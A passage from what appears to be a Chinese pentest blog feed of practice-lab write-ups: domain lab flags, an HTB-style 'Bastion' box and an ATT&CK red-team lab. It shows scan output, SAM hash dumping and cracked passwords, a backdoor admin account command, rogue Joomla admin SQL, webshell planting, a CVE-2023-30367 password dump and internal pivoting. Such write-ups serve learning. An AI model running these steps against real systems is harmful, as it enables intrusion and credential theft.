class="line-numbers-rows"><span></span></span></code></pre><p>同时绑定ip<br><img src="/Rxi134_FILE/38f28d489d1a44d14227971361df823a_MD5.jpeg"></p><p>但还是无法连接，原因不明<br><img src="/Rxi134_FILE/a4105ba270dc9575697f63bfb1275284_MD5.jpeg"></p><p>感觉有可能是域环境的问题<br><img src="/Rxi134_FILE/3dcb1bde5b35bbbfa5599aaf9842925a_MD5.jpeg"></p><h1 id="172-22-1-18-XIAORANG-OA01-信呼OA"><a href="#172-22-1-18-XIAORANG-OA01-信呼OA" class="headerlink" title="172.22.1.18 XIAORANG-OA01 信呼OA"></a>172.22.1.18 XIAORANG-OA01 信呼OA</h1><h2 id="获取flag2"><a href="#获取flag2" class="headerlink" title="获取flag2"></a>获取flag2</h2><p>其实有了域管就可以直接登录了<br><img src="/Rxi134_FILE/70fd03a3bec5e8486a1116547faaab91_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">2ce3-4813-87d4-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>机器开了rdp，顺带添加个管理员用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user hacker 1qaz2wsx /addnet localgroup administrators hacker /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/ff8a5db87663fad5dbe1ec090188b2b0_MD5.jpeg"></p><p>看了wp，要是硬打其实也比较简单，就不做了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>msf是很方便的东西</li></ul>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>W Easy-Bastion</title>
      <link href="/2024/10/06/W%20Easy-Bastion/"/>
      <url>/2024/10/06/W%20Easy-Bastion/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE  SERVICE      VERSION22/tcp    open   ssh          OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey:|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)25/tcp    closed smtp110/tcp   closed pop3135/tcp   open   msrpc        Microsoft Windows RPC139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open   msrpc        Microsoft Windows RPC49665/tcp open   msrpc        Microsoft Windows RPC49666/tcp open   msrpc        Microsoft Windows RPC49667/tcp open   msrpc        Microsoft Windows RPC49668/tcp open   msrpc        Microsoft Windows RPC49669/tcp open   msrpc        Microsoft Windows RPC49670/tcp open   msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="入侵-驻足"><a href="#入侵-驻足" class="headerlink" title="入侵 &amp; 驻足"></a>入侵 &amp; 驻足</h1><h2 id="smb-guest登录策略"><a href="#smb-guest登录策略" class="headerlink" title="smb guest登录策略"></a>smb guest登录策略</h2><p>对smb进行枚举<br><img src="/Rxi134_FILE/f6c2c7ba974326656f4877f7574b70c3_MD5.jpeg"><br>开启了guest登录策略，随机的用户名都会映射为guest用户</p><p><img src="/Rxi134_FILE/2c5baf067163bd972aa8780521eb8dad_MD5.jpeg"></p><h2 id="发现备份文件夹"><a href="#发现备份文件夹" class="headerlink" title="发现备份文件夹"></a>发现备份文件夹</h2><p>其中有个 note.txt 和 文件夹 WindowsImageBackup<br><img src="/Rxi134_FILE/41f43da27c87c35f9254b53c56ebc304_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.系统管理员：请不要将整个备份文件传输到本地，到子公司的 VPN 太慢了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h2><p>有两个vhd文件，分别进行挂载，只有一个盘里有东西<br><img src="/Rxi134_FILE/51cdaecb2c4cf1eead38021f71ae2d1c_MD5.jpeg"><br><img src="/Rxi134_FILE/f30f207fd53fb255d38e1a450334eb2d_MD5.jpeg"></p><h2 id="转储-SAM-SYSTEM"><a href="#转储-SAM-SYSTEM" class="headerlink" title="转储 SAM &amp; SYSTEM"></a>转储 SAM &amp; SYSTEM</h2><p>先看看能不能把默认账密搞到手<br><img src="/Rxi134_FILE/07dff079d282657e71ddd77fde55300e_MD5.jpeg"><br>利用mimikatz解密<br><img src="/Rxi134_FILE/3344986976eb459e67d751a265ab16f7_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">RID  : 000001f4 (500)User : Administrator  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0RID  : 000001f5 (501)User : GuestRID  : 000003e8 (1000)User : L4mpje  Hash NTLM: 26112010952d963c8dc4217daec986d9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到彩虹表查下<br><img src="/Rxi134_FILE/aabcee57e6af159e13b02acbe1c9f2e8_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">L4mpje:bureaulampje<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="openssh连接"><a href="#openssh连接" class="headerlink" title="openssh连接"></a>openssh连接</h2><p>ssh直接上去了<br><img src="/Rxi134_FILE/c2241c837a4a93e6f105d90a9319ad4b_MD5.jpeg"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="上传winpeas"><a href="#上传winpeas" class="headerlink" title="上传winpeas"></a>上传winpeas</h2><p>上传 winpeas 先进行一波收集，常见的攻击向量都没什么可用的</p><p>还有一个攻击向量是受攻击程序，但是用户权限太低了，连列出计算机安装的应用程序都做不到<br><img src="/Rxi134_FILE/11cb658d90ab733ab4215a72b3211f3a_MD5.jpeg"><br>我只能手动去翻翻Program Files了<br><img src="/Rxi134_FILE/2557f5b7e5b8155f61d1f8ff2bc58439_MD5.jpeg"></p><h2 id="利用受攻击软件-mRemoteNG-CVE-2023-30367-获取管理员密码"><a href="#利用受攻击软件-mRemoteNG-CVE-2023-30367-获取管理员密码" class="headerlink" title="利用受攻击软件 mRemoteNG CVE-2023-30367 获取管理员密码"></a>利用受攻击软件 mRemoteNG CVE-2023-30367 获取管理员密码</h2><blockquote><p><strong>mRemoteNG</strong> 是一个开源、多协议的远程连接管理器，支持多种远程连接协议，如 RDP（远程桌面）、VNC、SSH、Telnet 等。它通过集中化的管理界面，帮助用户快速组织和访问多台服务器或设备。</p></blockquote><p>下载下来看看版本，1.76.11<br><img src="/Rxi134_FILE/c5f4bbc6cfc831119faf18febec1633a_MD5.jpeg"></p><p><img src="/Rxi134_FILE/1bf55d33d97ed8c04969608258385bf8_MD5.jpeg"><br>请注意，配置密码加密和连接文件加密是不同的设置。配置密码加密仅用于加密配置文件中的密码，而连接文件加密用于加密整个配置文件本身。</p><p>此漏洞通过从内存中转储已解密的配置来绕过连接文件加密。但是不包含配置文件加密的密码（默认密钥 <code>mR3m</code> ），如果已设置自定义配置密码加密密钥&#x2F;密码，攻击者仍必须猜测自定义密钥。（参见 <a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file#mremoteng_decryptpy">mremoteng-decrypt.py 部分</a>）</p><p>确定加密的配置文件位置</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">l4mpje@BASTION C:\Users\L4mpje>dir c:\ /s /b | find "confCons.xml"                  c:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xmlc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402277353.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402339071.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402379227.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403070644.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403100488.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403220026.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403261268.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403272831.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403433299.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403486580.backup   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/192185e805cf2007aa0070c4db5760ec_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用脚本：<a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file">S1lkys&#x2F;CVE-2023-30367-mRemoteNG-password-dumper: Original PoC for CVE-2023-30367 (github.com)</a></p><p>解密如下<br><img src="/Rxi134_FILE/3dbfa1187e51d551f8073a269d52f1b0_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:thXLHM96BeKL0ER2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/62e546d0998c7bbe4efeed3aff61a5b5_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-3</title>
      <link href="/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/"/>
      <url>/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">漏洞详情 (qiyuanxuetang.net)</a></p></blockquote><p>打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</p><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>VMnet2和VMnet3配置如图所示<br><img src="/Rxi134_FILE/986298e29ccae5da90aa4f70ef4a1f12_MD5.jpeg"></p><p>然后启动所有虚拟机，并设置centos一个NAT网卡，同时重启网络服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>黑盒模式，没有账密</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>先扫端口</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)| ssh-hostkey: |   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)80/tcp   open  http    nginx 1.9.4|_http-title: Home|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-generator: Joomla! - Open Source Content Management| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.9.4| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1| mysql-info: |   Protocol: 10|   Version: 5.7.27-0ubuntu0.16.04.1|   Thread ID: 13|   Capabilities flags: 63487|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, SupportsCompression, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults|   Status: Autocommit|   Salt: \x11L>y\x0F&#123;>JK\x1AE3i \x1F=U6\x01\x04|_  Auth Plugin Name: mysql_native_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>22端口：ssh<br>80端口：这里扫出来一个 robots.txt，里面是joomla cms的目录<br>3306端口：mysql 5.7.27</p><p>goby上去打些常用poc，直接给我扫出个弱口令，<code>root:123</code><br><img src="/Rxi134_FILE/78677d2143ef5d9c9634c796800f071e_MD5.jpeg"><br>先不急着利用，再搜集些信息</p><p>Joomla CMS<br><img src="/Rxi134_FILE/8f51a446c2a6450bf98a94f5984556d0_MD5.jpeg"></p><p>Joomlascan扫出来一些目录信息，Joomla 3.9.12<br><img src="/Rxi134_FILE/2008ef20127c13f867bb5f0c6854e5d0_MD5.jpeg"></p><p>这里泄露了joomla的配置文件，其中包含了数据库密码和网站绝对路径<br><img src="/Rxi134_FILE/9511a58529b2dc8583373356f598d030_MD5.jpeg"><br><img src="/Rxi134_FILE/7d49600c2c611bd434de1e727f152f2d_MD5.jpeg"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$dbtype</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mysqli'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'testuser'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cvcvgjASD!@'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'joomla'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$dbprefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'am2zu_'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$live_site</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gXN9Wbpk7ef3A4Ys'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>远程连接数据库，先找找有没有可用的信息，在两个表里存放了账密信息<br><img src="/Rxi134_FILE/b374998d36dab3a65144481d70d63367_MD5.jpeg"></p><p>我们这个用户权限很低，几乎无权进行任何写操作<br><img src="/Rxi134_FILE/6059b9fba6afe41ea3719b42fb46155c_MD5.jpeg"></p><h1 id="尝试数据库写马"><a href="#尝试数据库写马" class="headerlink" title="尝试数据库写马"></a>尝试数据库写马</h1><p>回到root用户，现在有网站的绝对路径，into oufile是没有限制，但是网站目录无权写入<br><img src="/Rxi134_FILE/92032314d1c8e5806e2c200151dd34f5_MD5.jpeg"></p><h1 id="尝试破解哈希"><a href="#尝试破解哈希" class="headerlink" title="尝试破解哈希"></a>尝试破解哈希</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">891Super Useradministratortest@test.com$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2184Super Useradmintest@test.com$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>becrypt，hashcat没爆出来</p><h1 id="尝试添加新用户"><a href="#尝试添加新用户" class="headerlink" title="尝试添加新用户"></a>尝试添加新用户</h1><p><img src="/Rxi134_FILE/ae2610f8d43a4f32cafab473d5459e67_MD5.jpeg"><br>添加了一个用户，但还是登陆失败</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_users<span class="token variable">`</span></span>   <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>name<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>password<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>params<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>registerDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastvisitDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastResetTime<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span><span class="token string">'Administrator2'</span>, <span class="token string">'admin2'</span>,    <span class="token string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="token string">''</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_user_usergroup_map<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>user_id<span class="token variable">`</span></span>,<span class="token variable"><span class="token variable">`</span>group_id<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span>LAST_INSERT_ID<span class="token punctuation">(</span><span class="token punctuation">)</span>,<span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把管理员密码改掉就能登上了<br><img src="/Rxi134_FILE/146fb934f6679b623540b3006b2732fe_MD5.jpeg"><br><img src="/Rxi134_FILE/d4a5ab449597882bd67504629888279e_MD5.jpeg"></p><h1 id="Joomla-后台主题写马"><a href="#Joomla-后台主题写马" class="headerlink" title="Joomla!后台主题写马"></a>Joomla!后台主题写马</h1><p><img src="/Rxi134_FILE/6740098f1b6cc83b4bdd8c52d1b89792_MD5.jpeg"></p><p>任意点击一个主题，修改模板，访问&#x2F;templates&#x2F;beez3&#x2F;error.php即可，上的蚁剑</p><h2 id="disabled-function绕过"><a href="#disabled-function绕过" class="headerlink" title="disabled_function绕过"></a>disabled_function绕过</h2><p>收到 disabled_function 的限制<br><img src="/Rxi134_FILE/9c6a0ef4e19e9a0e0d430910129ee794_MD5.jpeg"></p><p>蚁剑有专门的插件，PHP7_GC_UAF可以成功绕过<br><img src="/Rxi134_FILE/3fc2dc2771fd7290096d71b82198b1ea_MD5.jpeg"></p><h1 id="权限提升到用户"><a href="#权限提升到用户" class="headerlink" title="权限提升到用户"></a>权限提升到用户</h1><p>开了22端口，看看有没有id_rsa<br><img src="/Rxi134_FILE/92f8b5eead72a9227bdd38034f59d422_MD5.jpeg"><br>没有.ssh文件夹，看来不行</p><p>上传linpeas进行一波收集，也没有什么可用的攻击面，倒是内核版本很低，可以提权<br><img src="/Rxi134_FILE/adbec4c2b344b7caa56b72867a62b2b0_MD5.jpeg"></p><p>模糊匹配一些敏感词，比如password、passwd、pass、username</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-E</span> <span class="token string">'passwd*|password*'</span> /var/www/html /home/yy /tmp  <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/cd51a330c12b4b26c72a9d13cff7ffe2_MD5.jpeg"></p><p>在&#x2F;tmp下找到可疑账密<br><img src="/Rxi134_FILE/8f2484e2010dab9fb80f512537793802_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">adduser wwwuserpasswd wwwuser_123Aqx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ssh<br><img src="/Rxi134_FILE/734b925dfa65474c2bafd496dd89bc56_MD5.jpeg"></p><p>再上linpeas进行一波收集，还是没什么可用的</p><h1 id="93网段探测"><a href="#93网段探测" class="headerlink" title="93网段探测"></a>93网段探测</h1><p>存在一个 93 网段<br><img src="/Rxi134_FILE/40dfbfc534c50942d6723dda6a74e4ce_MD5.jpeg"></p><p>不好上线CS，这里选择上线msf<br><img src="/Rxi134_FILE/eab5ad07341f9718763f4f9d39ed346d_MD5.jpeg"></p><h2 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h2><p>上传fscan</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start ping(icmp) Target 192.168.93.10   is alive(icmp) Target 192.168.93.20   is alive(icmp) Target 192.168.93.30   is alive(icmp) Target 192.168.93.100  is alive(icmp) Target 192.168.93.120  is alive[*] Icmp alive hosts len is: 5192.168.93.20:80 open192.168.93.30:135 open192.168.93.10:135 open192.168.93.20:135 open192.168.93.120:22 open192.168.93.100:80 open192.168.93.100:22 open192.168.93.30:445 open192.168.93.30:139 open192.168.93.100:3306 open192.168.93.20:1433 open192.168.93.120:3306 open192.168.93.10:139 open192.168.93.20:445 open192.168.93.20:139 open192.168.93.10:445 open192.168.93.120:80 open192.168.93.10:88 open[*] alive ports len is: 18start vulscan[*] NetInfo [*]192.168.93.30   [->]win7   [->]192.168.93.30[*] NetInfo [*]192.168.93.10   [->]WIN-8GA56TNV3MV   [->]192.168.93.10[*] NetBios 192.168.93.10   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600[*] OsInfo 192.168.93.10(Windows Server 2012 R2 Datacenter 9600)[*] NetBios 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2[*] NetInfo [*]192.168.93.20   [->]win2008   [->]192.168.93.20[*] OsInfo 192.168.93.30(Windows 7 Professional 7601 Service Pack 1)[*] WebTitle http://192.168.93.20      code:404 len:315    title:Not Found[*] OsInfo 192.168.93.20(Windows Server (R) 2008 Datacenter 6003 Service Pack 2)[+] mysql 192.168.93.100:3306:root 123[+] mysql 192.168.93.120:3306:root 123[*] WebTitle http://192.168.93.100     code:200 len:16020  title:Home[*] WebTitle http://192.168.93.120     code:200 len:16020  title:Home已完成 16/18 [-] ssh 192.168.93.100:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.100:22 root Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.100:22 admin admin1 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.120:22 admin a11111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 18/18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先整理一下，93段有哪些机子</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">192.168.93.10 Windows Server 2012 R2192.168.93.20 win2008192.168.93.30 win7192.168.93.100 centos 我们所在的位置192.168.93.120 linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fscan扫出一个 mysql 弱口令 <code>root:123</code>，是120那台机子</p><h1 id="ew搭建socks5代理"><a href="#ew搭建socks5代理" class="headerlink" title="ew搭建socks5代理"></a>ew搭建socks5代理</h1><p><img src="/Rxi134_FILE/014ea430e8b41de1c5787eb35353ce0d_MD5.jpeg"></p><p>再利用proxfiler实现全局代理<br><img src="/Rxi134_FILE/8570d52d14d969703d275a881a58b406_MD5.jpeg"></p><h1 id="120备份服务器"><a href="#120备份服务器" class="headerlink" title="120备份服务器"></a>120备份服务器</h1><p>navicat连接上数据库<br><img src="/Rxi134_FILE/8c6124efb27613eb95e74468e7f28b90_MD5.jpeg"><br>数据库完全一样，这有可能是个备份服务器<br><img src="/Rxi134_FILE/d80b26776f729e5e972fb3da354c3d06_MD5.jpeg"></p><p>尝试用centos的密码ssh上去，被拒绝，照着原来的写马就行，这里就不再重复了</p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="尝试永恒之蓝"><a href="#尝试永恒之蓝" class="headerlink" title="尝试永恒之蓝"></a>尝试永恒之蓝</h2><p>这三个windows机器都开了445，给msf加一段session路由，扫这三个windows机器<br><img src="/Rxi134_FILE/99886acb32e07f00ecc70b94fe1ed86f_MD5.jpeg"><br><img src="/Rxi134_FILE/0cafa142dcd00f1f7fd4d90e1f4e8f14_MD5.jpeg"><br>啥都没有</p><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul><li><p>10机器 - Windows Server 2012 R2</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped88/tcp    open  tcpwrapped110/tcp   open  tcpwrapped135/tcp   open  tcpwrapped139/tcp   open  tcpwrapped389/tcp   open  tcpwrapped445/tcp   open  tcpwrapped Windows Server 2012 R2 Datacenter 9600 tcpwrapped464/tcp   open  tcpwrapped593/tcp   open  tcpwrapped636/tcp   open  tcpwrapped3268/tcp  open  tcpwrapped3269/tcp  open  tcpwrapped49155/tcp open  tcpwrapped49157/tcp open  tcpwrapped49158/tcp open  tcpwrapped49159/tcp open  tcpwrapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>20机器 - win2008</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE      VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2580/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found110/tcp   open  tcpwrapped135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Windows Server (R) 2008 Datacenter 6003 Service Pack 2 microsoft-ds (workgroup: TEST)1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 10.00.1600.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Issuer: commonName=SSL_Self_Signed_Fallback| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2019-12-15T05:29:23| Not valid after:  2049-12-15T05:29:23| MD5:   53e9:ab09:d053:84ac:5740:c08b:c93a:e843|_SHA-1: a6a9:c4bd:6d50:a57c:0bec:ad38:5766:7032:0965:33e6|_ssl-date: 2024-10-04T11:53:59+00:00; 0s from scanner time.| ms-sql-ntlm-info:|   192.168.93.20\MSSQLSERVER:|     Target_Name: TEST|     NetBIOS_Domain_Name: TEST|     NetBIOS_Computer_Name: WIN2008|     DNS_Domain_Name: test.org|     DNS_Computer_Name: win2008.test.org|     DNS_Tree_Name: test.org|_    Product_Version: 6.0.6003| ms-sql-info:|   192.168.93.20\MSSQLSERVER:|     Instance name: MSSQLSERVER|     Version:|       name: Microsoft SQL Server 2008 RTM|       number: 10.00.1600.00|       Product: Microsoft SQL Server 2008|       Service pack 